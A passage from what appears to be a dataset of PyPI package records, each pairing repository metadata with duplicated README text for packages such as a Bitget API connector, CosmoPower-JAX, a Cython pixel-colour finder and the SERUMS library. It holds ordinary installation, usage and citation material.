---
這是一個用於 Bitget API 的 Python 套件，其中包含了 Bitget 官方文件中的所有 API，包括 REST API 和 WebSocket API。

**如果您在使用這個工具時遇到問題，或者想要新增某些功能，請開啟一個[問題](https://github.com/parker178912/bitget-python-connector/issues)。**

# Get Started and Documentation 使用及說明
If you haven't regist a Bitget account, use this link to save 10% on all of your trade fees, and can get rewards up to $5,005.
* [Register an account with Bitget.](https://partner.bitget.com/bg/GBMPCQ)
> I am in no way affiliated with Bitget, please use it at your own risk.
---
如果您還沒有在 Bitget 註冊帳戶，可以使用以下連結，以享有所有交易費用 10% 的折扣，並有機會獲得高達 $5,005 的獎勵。
* [請註冊一個 Bitget 帳戶。](https://partner.bitget.com/bg/GBMPCQ)
> 本人與 Bitget 無任何關聯，請自行承擔使用風險。


# Install 安裝
    pip install bitget-python-connector

# Usage 使用
1. [Create your API KEY, your SECRET KEY and your PASSPHRASE.](https://www.bitget.com/en/support/articles/360038968251-API%20Creation%20Guide)
2. Check out the examples folder and put your info in it.  
---
1. [請創建您的 API KEY、SECRET KEY 和 PASSPHRASE。](https://www.bitget.com/en/support/articles/360038968251-API%20Creation%20Guide)
2. 並將上述信息填入example資料夾中，您想使用的檔案相對應的變數內。

## Donation
Waited

## Release Notes
Waited

## Resources
* [Bitget API docs](https://bitgetlimited.github.io/apidoc/en/mix/#welcome)
  * [Example Bitget rest API](https://github.com/parker178912/bitget-python-connector/tree/main/examples)
  * [Example Bitget websocket API](https://github.com/parker178912/bitget-python-connector/tree/main/examples)

## Contribution 
* Fork [this repository](https://github.com/parker178912/bitget-python-connector).
* Make pull requests with proper commit message.
","# bitget-python-connector

[![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/parker178912/bitget-python-connector/blob/main/LICENSE)
[![bitget-python-connector Version](https://img.shields.io/pypi/v/bitget-python-connector?logo=pypi)](https://pypi.org/project/bitget-python-connector/)
[![bitget-python-connector Python Versions](https://img.shields.io/pypi/pyversions/bitget-python-connector?logo=pypi)](https://pypi.org/project/bitget-python-connector/)
[![Downloads](https://static.pepy.tech/badge/bitget-python-connector)](https://pypi.org/project/bitget-python-connector/)

This is a python package for [Bitget](https://partner.bitget.com/bg/GBMPCQ) API, it including all the API on Bitget official documents, both for the REST and the websocket API.

**If you face some problems with the tool or you want some additional function , please open an [Issue](https://github.com/parker178912/bitget-python-connector/issues)**.

---
這是一個用於 Bitget API 的 Python 套件，其中包含了 Bitget 官方文件中的所有 API，包括 REST API 和 WebSocket API。

**如果您在使用這個工具時遇到問題，或者想要新增某些功能，請開啟一個[問題](https://github.com/parker178912/bitget-python-connector/issues)。**

# Get Started and Documentation 使用及說明
If you haven't regist a Bitget account, use this link to save 10% on all of your trade fees, and can get rewards up to $5,005.
* [Register an account with Bitget.](https://partner.bitget.com/bg/GBMPCQ)
> I am in no way affiliated with Bitget, please use it at your own risk.
---
如果您還沒有在 Bitget 註冊帳戶，可以使用以下連結，以享有所有交易費用 10% 的折扣，並有機會獲得高達 $5,005 的獎勵。
* [請註冊一個 Bitget 帳戶。](https://partner.bitget.com/bg/GBMPCQ)
> 本人與 Bitget 無任何關聯，請自行承擔使用風險。


# Install 安裝
    pip install bitget-python-connector

# Usage 使用
1. [Create your API KEY, your SECRET KEY and your PASSPHRASE.](https://www.bitget.com/en/support/articles/360038968251-API%20Creation%20Guide)
2. Check out the examples folder and put your info in it.  
---
1. [請創建您的 API KEY、SECRET KEY 和 PASSPHRASE。](https://www.bitget.com/en/support/articles/360038968251-API%20Creation%20Guide)
2. 並將上述信息填入example資料夾中，您想使用的檔案相對應的變數內。

## Donation
Waited

## Release Notes
Waited

## Resources
* [Bitget API docs](https://bitgetlimited.github.io/apidoc/en/mix/#welcome)
  * [Example Bitget rest API](https://github.com/parker178912/bitget-python-connector/tree/main/examples)
  * [Example Bitget websocket API](https://github.com/parker178912/bitget-python-connector/tree/main/examples)

## Contribution 
* Fork [this repository](https://github.com/parker178912/bitget-python-connector).
* Make pull requests with proper commit message.
",parker178912/bitget-python-connector
geoshaha-haoyu,https://github.com/hniu-tamu/geoshaha-haoyu,0,463,463,"# geoshaha-haoyu


[![image](https://img.shields.io/pypi/v/geoshaha-haoyu.svg)](https://pypi.python.org/pypi/geoshaha-haoyu)
[![image](https://img.shields.io/conda/vn/conda-forge/geoshaha-haoyu.svg)](https://anaconda.org/conda-forge/geoshaha-haoyu)


**Python Boilerplate contains all the boilerplate you need to create a Python package.**


-   Free software: MIT license
-   Documentation: https://hniu-tamu.github.io/geoshaha-haoyu
    

## Features

-   TODO
","# geoshaha-haoyu


[![image](https://img.shields.io/pypi/v/geoshaha-haoyu.svg)](https://pypi.python.org/pypi/geoshaha-haoyu)
[![image](https://img.shields.io/conda/vn/conda-forge/geoshaha-haoyu.svg)](https://anaconda.org/conda-forge/geoshaha-haoyu)


**Python Boilerplate contains all the boilerplate you need to create a Python package.**


-   Free software: MIT license
-   Documentation: https://hniu-tamu.github.io/geoshaha-haoyu
    

## Features

-   TODO
",hniu-tamu/geoshaha-haoyu
cosmopower-jax,https://github.com/dpiras/cosmopower-jax,4,4593,4593,"# CosmoPower-JAX

(We will add a logo soon!)

`CosmoPower-JAX` in an extension of the [CosmoPower](https://github.com/alessiospuriomancini/cosmopower) framework to emulate cosmological power spectra in a differentiable way. With `CosmoPower-JAX` you can efficiently run Hamiltonian Monte Carlo with hundreds of parameters (for example, nuisance parameters describing systematic effects), on CPUs and GPUs, in a fraction of the time which would be required with traditional methods. We provide some examples on how to use the neural emulators below, and more applications in our paper (coming soon).

Of course, with `CosmoPower-JAX` you can also obtain efficient and differentiable predictions of cosmological power spectra. We show how to achieve this in less than 5 lines of code below.

## Installation

To install `CosmoPower-JAX`, you can simply use `pip`:

    pip install cosmopower-jax

We recommend doing it in a fresh `conda` environment, to avoid clashes (e.g. `conda create -n cpj python=3.9 && conda activate cpj`). Alternatively, you can:

    git clone https://github.com/dpiras/cosmopower-jax.git
    cd cosmopower-jax
    pip install . 

The latter will also give you access to a Jupyter notebook with some examples.

## Usage & example

After the installation, getting a cosmological power spectrum prediction is as simple as (e.g. for the CMB temperature power spectrum):

    import numpy as np
    from cosmopower_jax.cosmopower_jax import CosmoPowerJAX as CPJ
    # omega_b, omega_cdm, h, tau, n_s, ln10^10A_s
    cosmo_params = np.array([0.025, 0.11, 0.68, 0.1, 0.97, 3.1])
    emulator = CPJ(probe='cmb_tt')
    emulator_predictions = emulator.predict(cosmo_params)

Similarly, we can also compute derivatives like:

    emulator_derivatives = emulator.derivative(cosmo_params)

We provide a full walkthrough in the accompanying [Jupyter notebook](https://github.com/dpiras/cosmopower-jax/blob/main/notebooks/emulators_example.ipynb), and we describe `CosmoPower-JAX` in detail in the release paper. We currently do not provide the code to train a neural-network model in JAX; if you would like to re-train a JAX-based neural network on different data, [raise an issue](https://github.com/dpiras/cosmopower-jax/issues) or contact [Davide Piras](mailto:davide.piras@unige.ch).

## Contributing and contacts

Feel free to [fork](https://github.com/dpiras/cosmopower-jax/fork) this repository to work on it; otherwise, please [raise an issue](https://github.com/dpiras/cosmopower-jax/issues) or contact [Davide Piras](mailto:davide.piras@unige.ch).

## Citation
If you use `CosmoPower-JAX` in your work, please cite both papers as follows:

    @article{SpurioMancini2022,
             title={CosmoPower: emulating cosmological power spectra for 
             accelerated Bayesian inference from next-generation surveys},
             volume={511},
             ISSN={1365-2966},
             url={http://dx.doi.org/10.1093/mnras/stac064},
             DOI={10.1093/mnras/stac064},
             number={2},
             journal={Monthly Notices of the Royal Astronomical Society},
             publisher={Oxford University Press (OUP)},
             author={Spurio Mancini, Alessio and Piras, Davide and 
             Alsing, Justin and Joachimi, Benjamin and Hobson, Michael P},
             year={2022},
             month={Jan},
             pages={1771–1788}
             }
             
    @article{Piras23,
             title={CosmoPower-JAX: high-dimensional Bayesian inference with 
             differentiable cosmological emulators},
             volume={TBC},
             ISSN={TBC},
             url={TBC},
             DOI={TBC},
             number={TBC},
             journal={TBC},
             publisher={TBC},
             author={Piras, Davide and Spurio Mancini, Alessio},
             year={2023},
             month={TBC},
             pages={TBC}
             }

## License

`CosmoPower-JAX` is released under the GPL-3 license - see [LICENSE](https://github.com/dpiras/cosmopower-jax/blob/main/LICENSE)-, subject to 
the non-commercial use condition - see [LICENSE_EXT](https://github.com/dpiras/cosmopower-jax/blob/main/LICENSE_EXT).

     CosmoPower-JAX     
     Copyright (C) 2023 Davide Piras & contributors

     This program is released under the GPL-3 license (see LICENSE), 
     subject to a non-commercial use condition (see LICENSE_EXT).

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
","# CosmoPower-JAX

(We will add a logo soon!)

`CosmoPower-JAX` in an extension of the [CosmoPower](https://github.com/alessiospuriomancini/cosmopower) framework to emulate cosmological power spectra in a differentiable way. With `CosmoPower-JAX` you can efficiently run Hamiltonian Monte Carlo with hundreds of parameters (for example, nuisance parameters describing systematic effects), on CPUs and GPUs, in a fraction of the time which would be required with traditional methods. We provide some examples on how to use the neural emulators below, and more applications in our paper (coming soon).

Of course, with `CosmoPower-JAX` you can also obtain efficient and differentiable predictions of cosmological power spectra. We show how to achieve this in less than 5 lines of code below.

## Installation

To install `CosmoPower-JAX`, you can simply use `pip`:

    pip install cosmopower-jax

We recommend doing it in a fresh `conda` environment, to avoid clashes (e.g. `conda create -n cpj python=3.9 && conda activate cpj`). Alternatively, you can:

    git clone https://github.com/dpiras/cosmopower-jax.git
    cd cosmopower-jax
    pip install . 

The latter will also give you access to a Jupyter notebook with some examples.

## Usage & example

After the installation, getting a cosmological power spectrum prediction is as simple as (e.g. for the CMB temperature power spectrum):

    import numpy as np
    from cosmopower_jax.cosmopower_jax import CosmoPowerJAX as CPJ
    # omega_b, omega_cdm, h, tau, n_s, ln10^10A_s
    cosmo_params = np.array([0.025, 0.11, 0.68, 0.1, 0.97, 3.1])
    emulator = CPJ(probe='cmb_tt')
    emulator_predictions = emulator.predict(cosmo_params)

Similarly, we can also compute derivatives like:

    emulator_derivatives = emulator.derivative(cosmo_params)

We provide a full walkthrough in the accompanying [Jupyter notebook](https://github.com/dpiras/cosmopower-jax/blob/main/notebooks/emulators_example.ipynb), and we describe `CosmoPower-JAX` in detail in the release paper. We currently do not provide the code to train a neural-network model in JAX; if you would like to re-train a JAX-based neural network on different data, [raise an issue](https://github.com/dpiras/cosmopower-jax/issues) or contact [Davide Piras](mailto:davide.piras@unige.ch).

## Contributing and contacts

Feel free to [fork](https://github.com/dpiras/cosmopower-jax/fork) this repository to work on it; otherwise, please [raise an issue](https://github.com/dpiras/cosmopower-jax/issues) or contact [Davide Piras](mailto:davide.piras@unige.ch).

## Citation
If you use `CosmoPower-JAX` in your work, please cite both papers as follows:

    @article{SpurioMancini2022,
             title={CosmoPower: emulating cosmological power spectra for 
             accelerated Bayesian inference from next-generation surveys},
             volume={511},
             ISSN={1365-2966},
             url={http://dx.doi.org/10.1093/mnras/stac064},
             DOI={10.1093/mnras/stac064},
             number={2},
             journal={Monthly Notices of the Royal Astronomical Society},
             publisher={Oxford University Press (OUP)},
             author={Spurio Mancini, Alessio and Piras, Davide and 
             Alsing, Justin and Joachimi, Benjamin and Hobson, Michael P},
             year={2022},
             month={Jan},
             pages={1771–1788}
             }
             
    @article{Piras23,
             title={CosmoPower-JAX: high-dimensional Bayesian inference with 
             differentiable cosmological emulators},
             volume={TBC},
             ISSN={TBC},
             url={TBC},
             DOI={TBC},
             number={TBC},
             journal={TBC},
             publisher={TBC},
             author={Piras, Davide and Spurio Mancini, Alessio},
             year={2023},
             month={TBC},
             pages={TBC}
             }

## License

`CosmoPower-JAX` is released under the GPL-3 license - see [LICENSE](https://github.com/dpiras/cosmopower-jax/blob/main/LICENSE)-, subject to 
the non-commercial use condition - see [LICENSE_EXT](https://github.com/dpiras/cosmopower-jax/blob/main/LICENSE_EXT).

     CosmoPower-JAX     
     Copyright (C) 2023 Davide Piras & contributors

     This program is released under the GPL-3 license (see LICENSE), 
     subject to a non-commercial use condition (see LICENSE_EXT).

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
",dpiras/cosmopower-jax
acs-axiom,https://github.com/AusClimateService/axiom,10,84,84,"A prototype utility for validating/applying metadata templates for scientific data.
","A prototype utility for validating/applying metadata templates for scientific data.
",ausclimateservice/axiom
locate-pixelcolor-cythonmulti,https://github.com/hansalemaos/locate_pixelcolor_cythonmulti,3,3523,3523,"# Detects colors in images 5-10 x faster than Numpy 

### pip install locate-pixelcolor-cythonmulti

#### Tested+compiled against Windows 10 / Python 3.10 / Anaconda

#### If you can't import it, compile it on your system (code at the end of this page)



### How to use it in Python 

```python
import numpy as np
import cv2
from locate_pixelcolor_cythonmulti import search_colors
# 4525 x 6623 x 3 picture https://www.pexels.com/pt-br/foto/foto-da-raposa-sentada-no-chao-2295744/
picx = r""C:\Users\hansc\Downloads\pexels-alex-andrews-2295744.jpg""
pic = cv2.imread(picx)
colors0 = np.array([[255, 255, 255]],dtype=np.uint8)
resus0 = search_colors(pic=pic, colors=colors0)
colors1=np.array([(66,  71,  69),(62,  67,  65),(144, 155, 153),(52,  57,  55),(127, 138, 136),(53,  58,  56),(51,  56,  54),(32,  27,  18),(24,  17,   8),],dtype=np.uint8)
resus1 =  search_colors(pic=pic, colors=colors1)
####################################################################
%timeit resus0=search_colors(pic,colors0)
32.3 ms Â± 279 Âµs per loop (mean Â± std. dev. of 7 runs, 10 loops each)

b,g,r = pic[...,0],pic[...,1],pic[...,2]
%timeit np.where(((b==255)&(g==255)&(r==255)))
150 ms Â± 209 Âµs per loop (mean Â± std. dev. of 7 runs, 10 loops each)
####################################################################
%timeit resus1=search_colors(pic, colors1)
151 ms Â± 3.21 ms per loop (mean Â± std. dev. of 7 runs, 10 loops each)

%timeit np.where(((b==66)&(g==71)&(r==69))|((b==62)&(g==67)&(r==65))|((b==144)&(g==155)&(r==153))|((b==52)&(g==57)&(r==55))|((b==127)&(g==138)&(r==136))|((b==53)&(g==58)&(r==56))|((b==51)&(g==56)&(r==54))|((b==32)&(g==27)&(r==18))|((b==24)&(g==17)&(r==8)))
1 s Â± 16.1 ms per loop (mean Â± std. dev. of 7 runs, 1 loop each)
####################################################################
```


### The Cython Code 

```python
# distutils: language = c++
# cython: language_level=3
# distutils: extra_compile_args = /openmp
# distutils: extra_link_args = /openmp


from cython.parallel cimport prange
cimport cython
import numpy as np
cimport numpy as np
import cython
from collections import defaultdict

@cython.boundscheck(False)
@cython.wraparound(False)
@cython.cdivision(True)
cpdef searchforcolor(unsigned char[:] pic, unsigned char[:] colors, int width, int totallengthpic, int totallengthcolor):
    cdef my_dict = defaultdict(list)
    cdef int i, j
    cdef unsigned char r,g,b
    for i in prange(0, totallengthcolor, 3,nogil=True):
        r = colors[i]
        g = colors[i + 1]
        b = colors[i + 2]
        for j in range(0, totallengthpic, 3):
            if (r == pic[j]) and (g == pic[j+1]) and (b == pic[j+2]):
                with gil:
                    my_dict[(r,g,b)].append(j )

    for key in my_dict.keys():
        my_dict[key] = np.dstack(np.divmod(np.array(my_dict[key]) // 3, width))[0]
    return my_dict

```


### setup.py to compile the code 


```python
# distutils: language = c++
# cython: language_level=3

from setuptools import Extension, setup
from Cython.Build import cythonize
import numpy as np
ext_modules = [
    Extension(""colorsearchcythonmulti"", [""colorsearchcythonmulti.pyx""], include_dirs=[np.get_include()],define_macros=[(""NPY_NO_DEPRECATED_API"", ""NPY_1_7_API_VERSION"")])
]

setup(
    name='colorsearchcythonmulti',
    ext_modules=cythonize(ext_modules),
)


# .\python.exe .\colorsearchcythonmultisetup.py build_ext --inplace
```
","# Detects colors in images 5-10 x faster than Numpy 

### pip install locate-pixelcolor-cythonmulti

#### Tested+compiled against Windows 10 / Python 3.10 / Anaconda

#### If you can't import it, compile it on your system (code at the end of this page)



### How to use it in Python 

```python
import numpy as np
import cv2
from locate_pixelcolor_cythonmulti import search_colors
# 4525 x 6623 x 3 picture https://www.pexels.com/pt-br/foto/foto-da-raposa-sentada-no-chao-2295744/
picx = r""C:\Users\hansc\Downloads\pexels-alex-andrews-2295744.jpg""
pic = cv2.imread(picx)
colors0 = np.array([[255, 255, 255]],dtype=np.uint8)
resus0 = search_colors(pic=pic, colors=colors0)
colors1=np.array([(66,  71,  69),(62,  67,  65),(144, 155, 153),(52,  57,  55),(127, 138, 136),(53,  58,  56),(51,  56,  54),(32,  27,  18),(24,  17,   8),],dtype=np.uint8)
resus1 =  search_colors(pic=pic, colors=colors1)
####################################################################
%timeit resus0=search_colors(pic,colors0)
32.3 ms Â± 279 Âµs per loop (mean Â± std. dev. of 7 runs, 10 loops each)

b,g,r = pic[...,0],pic[...,1],pic[...,2]
%timeit np.where(((b==255)&(g==255)&(r==255)))
150 ms Â± 209 Âµs per loop (mean Â± std. dev. of 7 runs, 10 loops each)
####################################################################
%timeit resus1=search_colors(pic, colors1)
151 ms Â± 3.21 ms per loop (mean Â± std. dev. of 7 runs, 10 loops each)

%timeit np.where(((b==66)&(g==71)&(r==69))|((b==62)&(g==67)&(r==65))|((b==144)&(g==155)&(r==153))|((b==52)&(g==57)&(r==55))|((b==127)&(g==138)&(r==136))|((b==53)&(g==58)&(r==56))|((b==51)&(g==56)&(r==54))|((b==32)&(g==27)&(r==18))|((b==24)&(g==17)&(r==8)))
1 s Â± 16.1 ms per loop (mean Â± std. dev. of 7 runs, 1 loop each)
####################################################################
```


### The Cython Code 

```python
# distutils: language = c++
# cython: language_level=3
# distutils: extra_compile_args = /openmp
# distutils: extra_link_args = /openmp


from cython.parallel cimport prange
cimport cython
import numpy as np
cimport numpy as np
import cython
from collections import defaultdict

@cython.boundscheck(False)
@cython.wraparound(False)
@cython.cdivision(True)
cpdef searchforcolor(unsigned char[:] pic, unsigned char[:] colors, int width, int totallengthpic, int totallengthcolor):
    cdef my_dict = defaultdict(list)
    cdef int i, j
    cdef unsigned char r,g,b
    for i in prange(0, totallengthcolor, 3,nogil=True):
        r = colors[i]
        g = colors[i + 1]
        b = colors[i + 2]
        for j in range(0, totallengthpic, 3):
            if (r == pic[j]) and (g == pic[j+1]) and (b == pic[j+2]):
                with gil:
                    my_dict[(r,g,b)].append(j )

    for key in my_dict.keys():
        my_dict[key] = np.dstack(np.divmod(np.array(my_dict[key]) // 3, width))[0]
    return my_dict

```


### setup.py to compile the code 


```python
# distutils: language = c++
# cython: language_level=3

from setuptools import Extension, setup
from Cython.Build import cythonize
import numpy as np
ext_modules = [
    Extension(""colorsearchcythonmulti"", [""colorsearchcythonmulti.pyx""], include_dirs=[np.get_include()],define_macros=[(""NPY_NO_DEPRECATED_API"", ""NPY_1_7_API_VERSION"")])
]

setup(
    name='colorsearchcythonmulti',
    ext_modules=cythonize(ext_modules),
)


# .\python.exe .\colorsearchcythonmultisetup.py build_ext --inplace
```
",hansalemaos/locate_pixelcolor_cythonmulti
antchain-partner,https://github.com/alipay/antchain-openapi-prod-sdk,3,996,996,"English | [简体中文](README-CN.md)

## Ant Chain PARTNER SDK for Python

## Requirements

- Python >= 3.6

## Installation

- **Install with pip**

Python SDK uses a common package management tool named `pip`. If pip is not installed, see the [pip user guide](https://pip.pypa.io/en/stable/installing/ ""pip User Guide"") to install pip.

```bash
# Install the antchain-partner
pip install antchain-partner
```

## Issues

[Opening an Issue](https://github.com/alipay/antchain-openapi-prod-sdk/issues/new), Issues not conforming to the guidelines may be closed immediately.

## Usage

[Quick Examples](https://github.com/alipay/antchain-openapi-prod-sdk)

## Changelog

Detailed changes for each release are documented in the [release notes](./ChangeLog.md).

## References

- [Latest Release](https://github.com/alipay/antchain-openapi-prod-sdk/tree/master/python)

## License

[Apache-2.0](http://www.apache.org/licenses/LICENSE-2.0)

Copyright (c) 2009-present, Alibaba Cloud All rights reserved.


","English | [简体中文](README-CN.md)

## Ant Chain PARTNER SDK for Python

## Requirements

- Python >= 3.6

## Installation

- **Install with pip**

Python SDK uses a common package management tool named `pip`. If pip is not installed, see the [pip user guide](https://pip.pypa.io/en/stable/installing/ ""pip User Guide"") to install pip.

```bash
# Install the antchain-partner
pip install antchain-partner
```

## Issues

[Opening an Issue](https://github.com/alipay/antchain-openapi-prod-sdk/issues/new), Issues not conforming to the guidelines may be closed immediately.

## Usage

[Quick Examples](https://github.com/alipay/antchain-openapi-prod-sdk)

## Changelog

Detailed changes for each release are documented in the [release notes](./ChangeLog.md).

## References

- [Latest Release](https://github.com/alipay/antchain-openapi-prod-sdk/tree/master/python)

## License

[Apache-2.0](http://www.apache.org/licenses/LICENSE-2.0)

Copyright (c) 2009-present, Alibaba Cloud All rights reserved.


",alipay/antchain-openapi-prod-sdk
serums,https://github.com/drjdlarson/serums,5,6600,6177,"SERUMS
======

A Python package for Statistical Error and Risk Utility for Multi-sensor Systems (SERUMS) developed by the Laboratory for Autonomy, GNC, and Estimation Research (LAGER) at the University of Alabama (UA).

.. contents:: Table of Contents
    :depth: 2
    :local:

..
    BEGIN LINKS INCLUDE

.. |Open in Dev Containers| image:: https://img.shields.io/static/v1?label=Dev%20Containers&message=Open&color=blue&logo=visualstudiocode
   :target: https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/drjdlarson/serums.git

.. |Test Status| image:: https://drjdlarson.github.io/serums/reports/junit/tests-badge.svg?dummy=8484744
    :target: https://drjdlarson.github.io/serums/reports/junit/junit.html

.. |Test Cov| image:: https://drjdlarson.github.io/serums/reports/coverage/coverage-badge.svg?dummy=8484744
    :target: https://drjdlarson.github.io/serums/reports/coverage/index.html

..
    END LINKS INCLUDE

|Open in Dev Containers| |Test Status| |Test Cov|

..
    BEGIN TOOLCHAIN INCLUDE

This project uses the pytest for developing and running the tests (with extensions for generating summary and coverage reports), tox automates setting up and running the test environment (as well as the documentation), Sphinx is used for documenting the code, and the Black formatter is used to auto format the python code. This project also follows `semantic versioning <https://semver.org/>`__ where any api breaking changes will increment the major version number. Additionally, a prebuilt docker container image is provided to get started with developing for this library. It contains all of the needed tools to compile the code, run the tests, and build the documentation. The docker container can be used within VS Code through their dev container extension to allow editing local files but compiling using the toolchain provided within the container.


Development Environment Setup
-----------------------------
It is recommended to use VS Code with the dev containers extension for developing. Development containers allow the full toolchain to be automatically setup on most any machine capable of running Docker. For information on dev-containers see `here <https://code.visualstudio.com/docs/devcontainers/containers>`__ for an overview, `here <https://stackoverflow.com/questions/71402603/vs-code-in-docker-container-is-there-a-way-to-automatically-install-extensions>`__ for auto installing extensions in the container
and `here <https://pspdfkit.com/blog/2020/visual-studio-code-cpp-docker/>`__ for an example setup. The provided dev container also has useful extensions installed to ease development.

To being, make sure VS Code and git are installed. Additionally, make sure docker is installed for your system (`Windows <https://docs.docker.com/desktop/install/windows-install/>`__, `Mac <https://docs.docker.com/desktop/install/mac-install/>`_, `Linux <https://docs.docker.com/engine/install/>`__). Next, install the dev containers extension within VS Code. Clone the repository locally on your computer, for windows it is recommended to clone it within your linux subsystem directory (e.g. a sub-directory of your linux home folder) to improve performance within the container (the linux directories on Windows can be accessed through the file browser by typing :code:`\\wsl$` in the address bar and clicking on your distro). Now open the repo folder within VS Code (for windows you may need to connect to the linux subsystem first). Then you should be prompted to open the folder in the container, click yes. If you are not prompted, you can go to the command palette and start typing ""Open folder in container"". Now your terminal within VS Code will be running commands within the container but the files your are editing/creating will be accessible from your local machine's file browser.

Note if you click the open in container button on the repo's page it will automatically open VS Code, open the container, and clone the repo for you. However, it will do this within a docker volume so the files are only accessible within the container (ie you can't view them through your local file browser).


Example Workflow
----------------
Once the repository is open in the container, you can edit files, run tests, and make commits just like normal. For example, after editing some files and adding some validation tests to run these tests you would simply call the following from the root of the repository.

.. code-block:: 

    tox

This will attempt to run the all the validation tests, except those marked as slow, on multiple versions of python. If the python version can not be found, it will be skipped.

After running tests, it may be helpful to check the documentation build locally to ensure code comments are being pulled correctly. This can be done with

.. code-block:: 

    tox -e clean_docs
    tox -e docs_html

to remove any existing documenation builds and generate the html version. The output is placed in **docs/build/html** and can be viewed by opening the **docs/build/html/index.html** file in your web browser.


Notes on tox
------------
Tox will automatically create virtual environements, install dependencies, install the package, and run some commands in the virtual environment. These are defined in the **tox.ini** file in the repository. If tox is called without specifying an envrionment, it will run all of the default environments. The available environments can be listed with

.. code-block:: 

    tox -av

and a specific environment run by calling

.. code-block:: 

    tox -e ENV

where :code:`ENV` is replaced with the environment name. To pass positional arguments into the commands run within the tox environment you must use :code:`--` after the environment name but before the positional arguments. For example to run validation tests using Python 3.9 and pass the :code:`--runslow` option to pytest you would call :code:`tox -e py39-validation_test -- --runslow`.

Note, all tox commands must be run from the root of the repository because this is where the **tox.ini** file lives.

..
    END TOOLCHAIN INCLUDE

.. 
    BEGIN CITE INCLUDE

Cite
====
Please cite the framework as follows

.. code-block:: bibtex

    @Misc{serums,
        author       = {Jordan D. Larson, et al.},
        howpublished = {Web page},
        title        = {{SERUMS}: A Python library for Statistical Error and Risk Utility for Multi-sensor Systems},
        year         = {2022},
        url          = {https://github.com/drjdlarson/serums},
    }

..
    END CITE INCLUDE
","SERUMS
======

A Python package for Statistical Error and Risk Utility for Multi-sensor Systems (SERUMS) developed by the Laboratory for Autonomy, GNC, and Estimation Research (LAGER) at the University of Alabama (UA).

.. contents:: Table of Contents
    :depth: 2
    :local:

..
    BEGIN LINKS INCLUDE

.. |Open in Dev Containers| image:: https://img.shields.io/static/v1?label=Dev%20Containers&message=Open&color=blue&logo=visualstudiocode
   :target: https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/drjdlarson/serums.git

.. |Test Status| image:: https://drjdlarson.github.io/serums/reports/junit/tests-badge.svg?dummy=8484744
    :target: https://drjdlarson.github.io/serums/reports/junit/junit.html

.. |Test Cov| image:: https://drjdlarson.github.io/serums/reports/coverage/coverage-badge.svg?dummy=8484744
    :target: https://drjdlarson.github.io/serums/reports/coverage/index.html

..
    END LINKS INCLUDE

|Open in Dev Containers| |Test Status| |Test Cov|

..
    BEGIN TOOLCHAIN INCLUDE

This project uses the pytest for developing and running the tests (with extensions for generating summary and coverage reports), tox automates setting up and running the test environment (as well as the documentation), Sphinx is used for documenting the code, and the Black formatter is used to auto format the python code. This project also follows `semantic versioning `__ where any api breaking changes will increment the major version number. Additionally, a prebuilt docker container image is provided to get started with developing for this library. It contains all of the needed tools to compile the code, run the tests, and build the documentation. The docker container can be used within VS Code through their dev container extension to allow editing local files but compiling using the toolchain provided within the container.


Development Environment Setup
-----------------------------
It is recommended to use VS Code with the dev containers extension for developing. Development containers allow the full toolchain to be automatically setup on most any machine capable of running Docker. For information on dev-containers see `here `__ for an overview, `here `__ for auto installing extensions in the container
and `here `__ for an example setup. The provided dev container also has useful extensions installed to ease development.

To being, make sure VS Code and git are installed. Additionally, make sure docker is installed for your system (`Windows `__, `Mac `_, `Linux `__). Next, install the dev containers extension within VS Code. Clone the repository locally on your computer, for windows it is recommended to clone it within your linux subsystem directory (e.g. a sub-directory of your linux home folder) to improve performance within the container (the linux directories on Windows can be accessed through the file browser by typing :code:`\\wsl$` in the address bar and clicking on your distro). Now open the repo folder within VS Code (for windows you may need to connect to the linux subsystem first). Then you should be prompted to open the folder in the container, click yes. If you are not prompted, you can go to the command palette and start typing ""Open folder in container"". Now your terminal within VS Code will be running commands within the container but the files your are editing/creating will be accessible from your local machine's file browser.

Note if you click the open in container button on the repo's page it will automatically open VS Code, open the container, and clone the repo for you. However, it will do this within a docker volume so the files are only accessible within the container (ie you can't view them through your local file browser).


Example Workflow
----------------
Once the repository is open in the container, you can edit files, run tests, and make commits just like normal. For example, after editing some files and adding some validation tests to run these tests you would simply call the following from the root of the repository.

.. code-block:: 

    tox

This will attempt to run the all the validation tests, except those marked as slow, on multiple versions of python. If the python version can not be found, it will be skipped.

After running tests, it may be helpful to check the documentation build locally to ensure code comments are being pulled correctly. This can be done with

.. code-block:: 

    tox -e clean_docs
    tox -e docs_html

to remove any existing documenation builds and generate the html version. The output is placed in **docs/build/html** and can be viewed by opening the **docs/build/html/index.html** file in your web browser.


Notes on tox
------------
Tox will automatically create virtual environements, install dependencies, install the package, and run some commands in the virtual environment. These are defined in the **tox.ini** file in the repository. If tox is called without specifying an envrionment, it will run all of the default environments. The available environments can be listed with

.. code-block:: 

    tox -av

and a specific environment run by calling

.. code-block:: 

    tox -e ENV

where :code:`ENV` is replaced with the environment name. To pass positional arguments into the commands run within the tox environment you must use :code:`--` after the environment name but before the positional arguments. For example to run validation tests using Python 3.9 and pass the :code:`--runslow` option to pytest you would call :code:`tox -e py39-validation_test -- --runslow`.

Note, all tox commands must be run from the root of the repository because this is where the **tox.ini** file lives.

..
    END TOOLCHAIN INCLUDE

.. 
    BEGIN CITE INCLUDE

Cite
====
Please cite the framework as follows

.. code-block:: bibtex

    @Misc{serums,
        author       = {Jordan D. Larson, et al.},
        howpublished = {Web page},
        title        = {{SERUMS}: A Python library for Statistical Error and Risk Utility for Multi-sensor Systems},
        year         = {2022},
        url          = {https://github.com/drjdlarson/serums},
    }

..
    END CITE INCLUDE
",drjdlarson/serums
odoo-addon-stock-location-position,https://github.com/OCA/stock-logistics-warehouse,1,3238,2769,"=======================
Stock Location Position
=======================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Production%2FStable-green.png
